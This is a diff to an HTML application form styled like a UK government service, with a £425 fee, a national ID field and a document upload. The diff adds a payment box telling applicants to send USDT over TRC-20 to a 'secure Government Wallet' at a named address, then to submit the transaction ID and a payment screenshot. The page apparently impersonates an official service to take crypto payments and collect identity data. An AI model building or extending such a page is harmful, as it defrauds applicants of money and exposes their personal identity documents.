@@ -86,7 +86,7 @@
                     </div>
                     <div class="form-section">
                         <label for="nationalId">National ID Number</label>
-                        <span class="hint">CNIC (Pakistan) or Aadhar (India)</span>
+                        <span class="hint">Aadhar (India)</span>
                         <input type="text" id="nationalId" required>
                     </div>
 
@@ -145,7 +145,30 @@
                             Total: <span id="displayTotal">£425</span>
                         </div>
                     </div>
+<div class="payment-box">
+                    <div class="crypto-label">
+                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="24" alt="USDT">
+                        Payment Method: USDT (TRC-20)
+                    </div>
+                    <p style="font-size: 16px; margin-bottom: 10px;">Transfer the total USDT amount to the secure Government Wallet below:</p>
+                    
+                    <div class="address-container" id="copyAddress" onclick="copyToClipboard()">
+                        <span id="walletAddress">TV31kvsMheGcy7AmzrNDLDxYUcNAv59ivr</span>
+                        <span class="copy-hint" id="copyText">CLICK TO COPY ADDRESS</span>
+                    </div>
 
+                    <div style="margin-top: 25px;">
+                        <label for="txid">Transaction ID (TXID)</label>
+                        <span class="hint">Paste the 64-character hash after payment</span>
+                        <input type="text" id="txid" placeholder="Enter TXID" required>
+                    </div>
+
+                    <div style="margin-top: 25px;">
+                        <label>Upload Payment Screenshot</label>
+                        <span class="hint">Upload a clear proof of transfer for manual verification</span>
+                        <input type="file" id="payScreenshot" accept="image/*" required>
+                    </div>
+                </div>
                     <h2>6. Supporting documents</h2>
                     <div class="form-section" style="border: 2px dashed var(--govuk-border); padding: 20px; background: var(--govuk-grey);">
                         <input type="file" id="docs" multiple required>
